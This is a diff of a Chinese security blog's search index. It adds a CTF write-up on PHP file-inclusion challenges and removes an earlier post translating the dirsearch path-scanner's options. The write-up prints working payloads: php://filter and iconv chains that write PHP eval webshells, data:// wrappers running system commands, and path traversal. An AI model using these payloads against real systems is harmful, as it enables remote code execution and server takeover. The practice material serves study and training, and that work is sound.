+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=1.php</span><br><span class="line">进行URL全编码</span><br><span class="line">？file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[pass]);?&gt;</span><br><span class="line">写成</span><br><span class="line">之所以加上nb，是因为要把不需要的代码给解码掉，是前面剩下phpdie，一共6个字符，所以需要再加2个字符变8个</span><br><span class="line">content=nbPD9waHAgQGV2YWwoJF9QT1NUW3Bhc3NdKTs/Pg==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>将此传上去，就可以成功了</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_9.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_9.png" class title="This is an image">
+
+<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>直接改变之前的代码了，就过滤了php，还有过滤了一些符号。</p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>data：&#x2F;&#x2F; 伪协议</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat fla*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>进行base64编码，记住去除等号</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//db7b5767-69bb-4227-a74f-12e3e60bbed1.challenge.ctf.show/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKicpOw</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>传入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:text/plain,<span class="meta">&lt;?</span>PHP @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>进行base64编码，</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9QSFAgQGV2YWwoJF9QT1NUWydzaGVsbCddKTs/Pg==</span></span><br></pre></td></tr></table></figure>
+
+
+<p>传上直接getshell</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_10.png" alt="image_10"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_10.png" class title="This is an image">
+
+<h1 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h1><p>misc+lfi</p>
+<p>就是一道misc题目吧</p>
+<p>进去是一短视</p>
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_11.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_11.png" class title="This is an image">
+
+<p>好怀念的说</p>
+<p>直接使用file伪协议</p>
+<p>开始我使用常用的，没有回显，我就是只剩下flag.php，就出来了。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/../../../../../../flag.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_12.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_12.png" class title="This is an image">
+
+<h1 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: yu22x</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 18:16:59</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>又是要绕过死亡die，把常用都禁用了，在官网上有其他的</p>
+<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">PHP支持的编码方式</a></p>
+<p>UCS-2LE UCS-2BE编码</p>
+<p>测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>, <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;);</span></span><br><span class="line"><span class="string">echo &quot;经过一次反转:&quot;.$result.&quot;\n&quot;;</span></span><br><span class="line"><span class="string">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>本来想用4的试试，但是php die 不满足条件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">file=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span></span><br><span class="line">post:</span><br><span class="line">contents=?&lt;hp pvela$(P_SO[T]<span class="number">1</span>;)&gt;?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image_13.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%85%A5%E9%97%A8/image_13.png" class title="This is an image">
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>文件包含</tag>
+        <tag>练习题</tag>
       </tags>
   </entry>
   <entry>
@@ -399,8 +782,8 @@
 <li>前提：session 的存储位置可以获取</li>
 </ul>
 <p>通过phpinfo函数，读取session的存储位置，一般路径为：在session.save_path中有显示</p>
-<p><img src="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png"></p>
-<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png" class title="This is an image">
+<p><img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png"></p>
+<img src="/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220305193427532.png" class title="This is an image">
 
 <ul>
 <li>条件竞争</li>
@@ -571,389 +954,6 @@
       </tags>
   </entry>
   <entry>
-    <title>dirsearch-路径扫描</title>
-    <url>/2022/dirsearch/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一款高级命令行工具，旨在暴力破解网络服务器中的目录和文件，AKA 网络路径扫描器。</p>
-<p>dirsearch进行高精度，可以扩展的扫描，可以根据自己的需求定义，相对于御剑，我个人认为更好点。</p>
-<p><a href="https://github.com/maurosoria/dirsearch">dirsearch工具地址</a></p>
-<span id="more"></span>    
-
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
-<li>使用 git 安装：<code>git clone https://github.com/maurosoria/dirsearch.git</code></li>
-<li>使用 ZIP 文件安装：<a href="https://github.com/maurosoria/dirsearch/archive/master.zip">在此处下载</a></li>
-<li>使用 Docker 安装：（<code>docker build -t &quot;dirsearch:v0.4.1&quot;</code>更多<a href="https://github.com/maurosoria/dirsearch#support-docker">信息</a>）</li>
-<li>使用 Kali Linux 安装：<code>sudo apt-get install dirsearch</code></li>
-<li>使用 PyPi 安装：<code>pip3 install dirsearch</code></li>
-</ul>
-<p>安装库</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/maurosoria/dirsearch.git</span><br><span class="line">cd dirsearch</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSIONS&gt;</span><br></pre></td></tr></table></figure>
-
-<p>requirements.txt 中包含了 dirsearch 中需要的库。</p>
-<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             显示程序的版本号并退出</span><br><span class="line">  -h, --<span class="built_in">help</span>            显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">  Mandatory: <span class="comment">#强制性的</span></span><br><span class="line">    -u URL, --url=URL   目标网址</span><br><span class="line">    -l FILE, --url-list=FILE</span><br><span class="line">                        目标URL列表文件</span><br><span class="line">    --stdin             来自STDIN的目标URL列表</span><br><span class="line">    --cidr=CIDR         目标CIDR</span><br><span class="line">    --raw=FILE          从文件加载原始HTTP请求 (use `--scheme` flag to <span class="built_in">set</span> the scheme)</span><br><span class="line">    -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        用逗号分隔的扩展列表 (Example: php,asp)</span><br><span class="line">    -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span><br><span class="line">                        排除由逗号分隔的扩展列表 (Example: asp,jsp)</span><br><span class="line">    -f, --force-extensions</span><br><span class="line">                        为每个单词列表条目添加扩展名。默认情况下dirsearch仅将%EXT%关键字替换为扩展</span><br><span class="line"></span><br><span class="line">  Dictionary Settings: <span class="comment">#字典设置</span></span><br><span class="line">    -w WORDLIST, --wordlists=WORDLIST</span><br><span class="line">                        自定义词表 (用逗号分隔)</span><br><span class="line">    --prefixes=PREFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义前缀 (用逗号分隔)</span><br><span class="line">    --suffixes=SUFFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义后缀，忽略目录(用逗号分隔)</span><br><span class="line">    --only-selected     删除路径与选定路径具有不同的扩展名通过`-e的` (保留条目没有扩展名)</span><br><span class="line">    --remove-extensions</span><br><span class="line">                        删除所有路径中的扩展 (Example: admin.php -&gt; admin)</span><br><span class="line">    -U, --uppercase     Uppercase wordlist</span><br><span class="line">    -L, --lowercase     Lowercase wordlist</span><br><span class="line">    -C, --capital       Capital wordlist</span><br><span class="line"></span><br><span class="line">  General Settings: <span class="comment">#一般设置</span></span><br><span class="line">    -t THREADS, --threads=THREADS  线程数</span><br><span class="line">    -r, --recursive     暴力循环</span><br><span class="line">    --deep-recursive    对每个目录深度执行递归扫描</span><br><span class="line">                        (Example: api/users -&gt; api/)</span><br><span class="line">    --force-recursive   对每个找到的路径进行递归暴力，而不是只有路径以斜线结尾</span><br><span class="line">    --recursion-depth=DEPTH 最大递归深度</span><br><span class="line">    --recursion-status=CODES</span><br><span class="line">                        执行递归扫描的有效状态代码，支持范围 (用逗号分隔)</span><br><span class="line">    --subdirs=SUBDIRS   扫描给定URL的子目录 (用逗号分隔)</span><br><span class="line">    --exclude-subdirs=SUBDIRS</span><br><span class="line">                        在递归过程中排除以下子目录扫描 (用逗号分隔)</span><br><span class="line">    -i CODES, --include-status=CODES</span><br><span class="line">                        包括状态代码，用逗号分隔，支持范围 (Example: 200,300-399)</span><br><span class="line">    -x CODES, --exclude-status=CODES</span><br><span class="line">                        排除状态代码，用逗号分隔，支持范围 (Example: 301,500-599)</span><br><span class="line">    --exclude-sizes=SIZES</span><br><span class="line">                        按大小排除响应，以逗号分隔 (Example: 123B,4KB)</span><br><span class="line">    --exclude-texts=TEXTS</span><br><span class="line">                        按文本排除回复，用逗号分隔 (Example: <span class="string">&#x27;Not found&#x27;</span>, <span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">    --exclude-regexps=REGEXPS</span><br><span class="line">                        通过regexp排除响应，用逗号分隔</span><br><span class="line">                        (Example: <span class="string">&#x27;Not foun[a-z]&#123;1&#125;&#x27;</span>, <span class="string">&#x27;^Error$&#x27;</span>)</span><br><span class="line">    --exclude-redirects=REGEXPS</span><br><span class="line">                        通过重定向正则表达式或文本排除响应,</span><br><span class="line">                        用逗号分隔 (Example: <span class="string">&#x27;https://okta.com/*&#x27;</span>)</span><br><span class="line">    --exclude-content=PATH</span><br><span class="line">                        按此路径的响应内容排除响应</span><br><span class="line">    --skip-on-status=CODES</span><br><span class="line">                        无论何时命中其中一个状态码，跳过目标，用逗号分隔，支持范围</span><br><span class="line">    --minimal=LENGTH    最小响应长度</span><br><span class="line">    --maximal=LENGTH    最大响应长度</span><br><span class="line">    --max-time=SECONDS  扫描的最大运行时间</span><br><span class="line">    -q, --quiet-mode    安静模式</span><br><span class="line">    --full-url          输出中的完整URL (在中自动启用安静模式)</span><br><span class="line">    --no-color          没有彩色输出</span><br><span class="line"></span><br><span class="line">  Request Settings: <span class="comment">#请求设置</span></span><br><span class="line">    -m METHOD, --http-method=METHOD HTTP方法 (default: GET)</span><br><span class="line">    -d DATA, --data=DATA HTTP请求数据</span><br><span class="line">    -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP请求头，支持多个标志 (Example:</span><br><span class="line">                        -H <span class="string">&#x27;Referer: example.com&#x27;</span>)</span><br><span class="line">    --header-list=FILE  文件包含HTTP请求头</span><br><span class="line">    -F, --follow-redirects</span><br><span class="line">                        遵循HTTP重定向</span><br><span class="line">    --random-agent      为每个请求选择一个随机用户代理</span><br><span class="line">    --auth-type=TYPE    身份验证类型 (basic, digest, bearer, ntlm)</span><br><span class="line">    --auth=CREDENTIAL   认证凭证 (user:password or bearer token)</span><br><span class="line">    --user-agent=USERAGENT</span><br><span class="line">    --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">  Connection Settings: <span class="comment">#连接设置</span></span><br><span class="line">    --<span class="built_in">timeout</span>=TIMEOUT   连接超时</span><br><span class="line">    -s DELAY, --delay=DELAY</span><br><span class="line">                        请求之间的延迟</span><br><span class="line">    --proxy=PROXY       代理URL，支持HTTP和SOCKS代理 (Example:</span><br><span class="line">                        localhost:8080, socks5://localhost:8088)</span><br><span class="line">    --proxy-list=FILE   文件包含代理服务器</span><br><span class="line">    --replay-proxy=PROXY</span><br><span class="line">                        要使用找到的路径重播的代理</span><br><span class="line">    --scheme=SCHEME     默认方案 (对于原始请求或如果没有URL中的方案)</span><br><span class="line">    --max-rate=RATE     每秒最大请求数</span><br><span class="line">    --retries=RETRIES   失败请求的重试次数</span><br><span class="line">    -b, --request-by-hostname</span><br><span class="line">                        默认情况下，通过IP搜索速度请求。这将强制dirsearch按主机名请求</span><br><span class="line">    --ip=IP             服务器IP地址</span><br><span class="line">    --exit-on-error     每当发生错误时退出</span><br><span class="line"></span><br><span class="line">  Reports:</span><br><span class="line">    -o FILE, --output=FILE</span><br><span class="line">                        输出文件</span><br><span class="line">    --format=FORMAT     报告格式 (Available: simple, plain, json, xml,</span><br><span class="line">                        md, csv, html)</span><br></pre></td></tr></table></figure>
-
-<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>dirsearch 工具可以根据自己的需求进行配置，配置文件为 default.conf 。选择带 <code>#</code> 的进行配置。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If you want to edit dirsearch default configurations, you can</span><br><span class="line"># edit values in this file. Everything after `#` is a comment</span><br><span class="line"># and won&#x27;t be applied</span><br><span class="line"></span><br><span class="line">[mandatory]</span><br><span class="line">default-extensions = php,aspx,jsp,html,js</span><br><span class="line">force-extensions = False</span><br><span class="line"># exclude-extensions = old,log</span><br><span class="line"></span><br><span class="line">[general]</span><br><span class="line">threads = 30</span><br><span class="line">recursive = False</span><br><span class="line">deep-recursive = False</span><br><span class="line">force-recursive = False</span><br><span class="line">recursion-depth = 0</span><br><span class="line">exclude-subdirs = %%ff/</span><br><span class="line">random-user-agents = False</span><br><span class="line">max-time = 0</span><br><span class="line">full-url = False</span><br><span class="line">quiet-mode = False</span><br><span class="line">color = True</span><br><span class="line">recursion-status = 200-399,401,403</span><br><span class="line"># include-status = 200-299,401</span><br><span class="line"># exclude-status = 400,500-999</span><br><span class="line"># exclude-sizes = 0b,123gb</span><br><span class="line"># exclude-texts = &quot;Not found&quot;</span><br><span class="line"># exclude-regexps = &quot;403 [a-z]&#123;1,25&#125;&quot;</span><br><span class="line"># exclude-content = 404.html</span><br><span class="line"># skip-on-status = 429,999</span><br><span class="line"></span><br><span class="line">[reports]</span><br><span class="line">report-format = plain</span><br><span class="line">autosave-report = True</span><br><span class="line"># report-output-folder = /home/user</span><br><span class="line"># logs-location = /tmp</span><br><span class="line">## Supported: plain, simple, json, xml, md, csv, html</span><br><span class="line"></span><br><span class="line">[dictionary]</span><br><span class="line">lowercase = False</span><br><span class="line">uppercase = False</span><br><span class="line">capitalization = False</span><br><span class="line"># prefixes = .,admin</span><br><span class="line"># suffixes = ~,.bak</span><br><span class="line"># wordlist = db/dicc.txt</span><br><span class="line"></span><br><span class="line">[request]</span><br><span class="line">httpmethod = get</span><br><span class="line">## Lowercase only</span><br><span class="line">follow-redirects = False</span><br><span class="line"># headers-file = headers.txt</span><br><span class="line"># user-agent = MyUserAgent</span><br><span class="line"># cookie = SESSIONID=123</span><br><span class="line"></span><br><span class="line">[connection]</span><br><span class="line">timeout = 5</span><br><span class="line">delay = 0</span><br><span class="line">scheme = http</span><br><span class="line">maxrate = 0</span><br><span class="line">retries = 2</span><br><span class="line">request-by-hostname = False</span><br><span class="line">exit-on-error = False</span><br><span class="line"># proxy = localhost:8080</span><br><span class="line"># proxy-list = proxies.txt</span><br><span class="line"># replay-proxy = localhost:8000</span><br></pre></td></tr></table></figure>
-
-<h1 id="命令-使用"><a href="#命令-使用" class="headerlink" title="命令-使用"></a>命令-使用</h1><h2 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h2><p>对 URL 进行扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br></pre></td></tr></table></figure>
-
-<p>扫描固定后缀文件的 URL</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br></pre></td></tr></table></figure>
-
-<p>定义字典扫描</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</span><br></pre></td></tr></table></figure>
-
-<h2 id="暂停扫描"><a href="#暂停扫描" class="headerlink" title="暂停扫描"></a>暂停扫描</h2><p>dirsearch 允许您使用 CTRL+C 暂停扫描进度，从这里，您可以保存进度（稍后继续）、跳过当前目标或跳过当前子目录。</p>
-<p><img src="/pause.png"></p>
-
-
-<h2 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h2><ul>
-<li>通过使用**-r | –recursive**参数，dirsearch 将递归地暴力破解所有目录。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>您可以使用–recursion-depth</strong>设置最大递归深度，使用–recursion <strong>-</strong> status 设置递归状态码</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r --recursion-depth 3 --recursion-status 200-399</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>还有 2 个选项：</p>
-<p><strong>–force-recursive</strong> 和 <strong>–deep-recursive</strong></p>
-<ul>
-<li><strong>强制递归</strong>：暴力递归所有找到的路径，而不仅仅是路径以<code>/</code></li>
-<li><strong>深度递归</strong>：递归暴力破解路径的所有深度（<code>a/b/c</code>&#x3D;&gt; 添加<code>a/</code>，<code>a/b/</code>）</li>
-</ul>
-</li>
-</ul>
-<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程号 ( <strong>-t | –threads</strong> ) 反映了分离的蛮力进程的数量。所以线程数越大，dirsearch 运行得越快。默认情况下，线程数为 30，但如果您想加快进度，可以增加它。</p>
-<p>速度仍然很大程度上取决于服务器的响应时间。如果你的线程过大可能导致Dos</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20</span><br></pre></td></tr></table></figure>
-
-<h2 id="前缀-x2F-后缀"><a href="#前缀-x2F-后缀" class="headerlink" title="前缀&#x2F;后缀"></a>前缀&#x2F;后缀</h2><p>自定义扫描文件前缀或者后缀</p>
-<ul>
-<li><strong>–prefixes</strong>：为所有条目添加自定义前缀</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --prefixes .,admin,_</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tools</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">.tools</span><br><span class="line">admintools</span><br><span class="line">_tools</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–suffixes</strong>：为所有条目添加自定义后缀</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --suffixes ~</span><br></pre></td></tr></table></figure>
-
-<p>例子</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">internal</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">index.php~</span><br><span class="line">internal~</span><br></pre></td></tr></table></figure>
-
-<h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>在<code>db/</code>文件夹内，有几个“黑名单文件”。如果这些文件中的路径与文件名中提到的状态相同，则将从扫描结果中过滤掉它们。</p>
-<p>示例：如果您添加<code>admin.php</code>到<code>db/403_blacklist.txt</code>，每当您执行<code>admin.php</code>返回 403 的扫描时，都会从结果中过滤掉。</p>
-<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>使用**-i | –include-status<strong>和</strong>-x | –exclude-status**选择允许和不允许的响应状态码</p>
-<p>对于更高级的过滤器：</p>
-<ul>
-<li><strong>–exclude-sizes</strong></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-sizes 1B,243KB</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-texts</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-texts &quot;403 Forbidden&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-regexps</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-regexps &quot;^Error$&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>–exclude-redirects</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-redirects &quot;https://(.*).okta.com/*&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>-exclude-content</strong></li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-content /error.html</span><br></pre></td></tr></table></figure>
-
-<h2 id="原始请求"><a href="#原始请求" class="headerlink" title="原始请求"></a>原始请求</h2><p><strong>dirsearch</strong> 允许您从文件中导入原始请求。内容看起来像这样：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: admin.example.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
-
-<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>既然扫描网站，我们也可以选择使用 GET 或者 POST 方法</p>
